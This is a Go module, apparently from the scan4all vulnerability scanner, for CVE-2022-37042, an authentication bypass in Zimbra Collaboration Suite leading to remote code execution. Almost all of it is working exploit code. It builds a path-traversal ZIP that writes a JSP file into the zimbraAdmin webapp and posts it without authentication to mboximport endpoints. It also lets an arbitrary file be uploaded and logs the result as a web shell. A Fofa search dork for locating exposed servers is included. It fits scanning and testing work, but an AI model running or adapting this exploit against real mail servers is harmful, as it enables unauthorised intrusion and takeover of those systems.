package zimbra

import (
	"archive/zip"
	"bytes"
	"github.com/go-resty/resty/v2"
	"github.com/hktalent/scan4all/lib/util"
	"github.com/projectdiscovery/gologger"
	"io/ioutil"
	"math/rand"
	"net/url"
	"path/filepath"
	"strings"
	"time"
)

func genRandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func verify(target string) string {
	t := target
	paths := []string{"/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1",
		"/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd"}

	filename, keyStrings, zipContent := genEvilZip("null")

	client := resty.New()
	client.SetTimeout(15 * time.Second)

	for _, path := range paths {
		url := t + path
		resp, err := client.R().
			SetHeader("Accept-Encoding", "gzip, deflate").
			SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/600.2.17 (KHTML, like Gecko) Version/12.0 Safari/594.2").
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			SetBody(zipContent).
			Post(url)

		if err != nil {
			gologger.Warning().Msg("Request error: " + t)
			return "no path"
		}

		if resp.StatusCode() == 401 {
			url := t + "/zimbraAdmin/" + filename
			client := resty.New()
			client.SetTimeout(15 * time.Second)
			resp, _ := client.R().EnableTrace().Get(url)

			if strings.Contains(string(resp.Body()), keyStrings) {
				gologger.Print().Label("VULN").Msg(t + " is vulnerable :)")
				return path
			} else {
				continue
			}
		} else {
			continue
		}
	}

	gologger.Info().Msg(t + " is not vulnerable :(")
	return "no path"
}

func genEvilZip(file string) (string, string, []byte) {
	filename := genRandStr(12) + ".jsp"

	buf := new(bytes.Buffer)
	writer := zip.NewWriter(buf)
	defer writer.Close()
	evilpath := "../../../../mailboxd/webapps/zimbraAdmin/" + filename
	f, _ := writer.Create(evilpath)

	keyStrings1 := genRandStr(8)
	keyStrings2 := genRandStr(8)
	keyStrings := keyStrings1 + keyStrings2
	var content []byte = []byte("<%\nout.println(\"" + keyStrings1 + "\" + \"" + keyStrings2 + "\");\nnew java.io.File(application.getRealPath(request.getServletPath())).delete();\n%>")

	if file != "null" {
		content, _ = ioutil.ReadFile(filepath.Clean(file))
	}

	f.Write(content)
	f, _ = writer.Create(evilpath)
	f.Write(content)
	_ = writer.Close()

	// filename = strings.TrimSuffix(filename, path.Ext(filename)) + ".zip"
	// ioutil.WriteFile(filename, buf.Bytes(), 0777)

	return filename, keyStrings, buf.Bytes()
}

func GetVulInfo() *util.VulnInfo {
	return &util.VulnInfo{
		Name:    "CVE-2022-37042 Zimbra Auth Bypass leads to RCE",
		VulID:   []string{"CVE-2022-37042"},
		Version: "1.0",
		Author:  "0xf9",
		VulDate: "2022-10-07",
		References: []string{"https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/",
			"https://nvd.nist.gov/vuln/detail/CVE-2022-37042"},
		AppName:      "Zimbra",
		AppPowerLink: "https://www.zimbra.com/",
		AppVersion:   "Zimbra Collaboration Suite 8.8.15 and 9.0",
		VulType:      "RCE",
		Description:  "Zimbra Collaboration Suite (ZCS) 8.8.15 and 9.0 has mboximport functionality that receives a ZIP archive and extracts files from it. By bypassing authentication (i.e., not having an authtoken), an attacker can upload arbitrary files to the system, leading to directory traversal and remote code execution. NOTE: this issue exists because of an incomplete fix for CVE-2022-27925.",
		Category:     "REMOTE",
		Dork:         util.QueryDork{Fofa: `app="zimbra-邮件系统" && (protocol="http" || protocol="https")`},
	}
}

// doNulcie4S 'app="zimbra-邮件系统" && (protocol="http" || protocol="https")' config/nuclei-templates/cves/2022/CVE-2022-37042.yaml
func DoCheckCVE202237042(szUrl string) {
	oU, _ := url.Parse(szUrl)
	szUrl = strings.Join([]string{oU.Scheme, "://", oU.Host}, "")
	path := verify(szUrl)
	if path != "no path" {
		if exploit(szUrl, "null", path) {
			util.SendLog(szUrl, "scan4all", "CVE-2022-37042", "")
		}
	}
}

func exploit(target string, file string, path string) bool {
	url := target + path

	filename, _, zipContent := genEvilZip(file)

	client := resty.New()
	//client.SetProxy(HttpProxy)
	client.SetTimeout(15 * time.Second)

	resp, err := client.R().
		SetHeader("Accept-Encoding", "gzip, deflate").
		SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/600.2.17 (KHTML, like Gecko) Version/12.0 Safari/594.2").
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetBody(zipContent).
		Post(url)

	if err != nil {
		gologger.Warning().Msg("Request error: " + target)
		return false
	}

	if resp.StatusCode() == 401 {
		url := target + "/zimbraAdmin/" + filename
		gologger.Info().Msg("Uploaded Successfully! Webshell: " + url)
		return true
	}

	return false
}
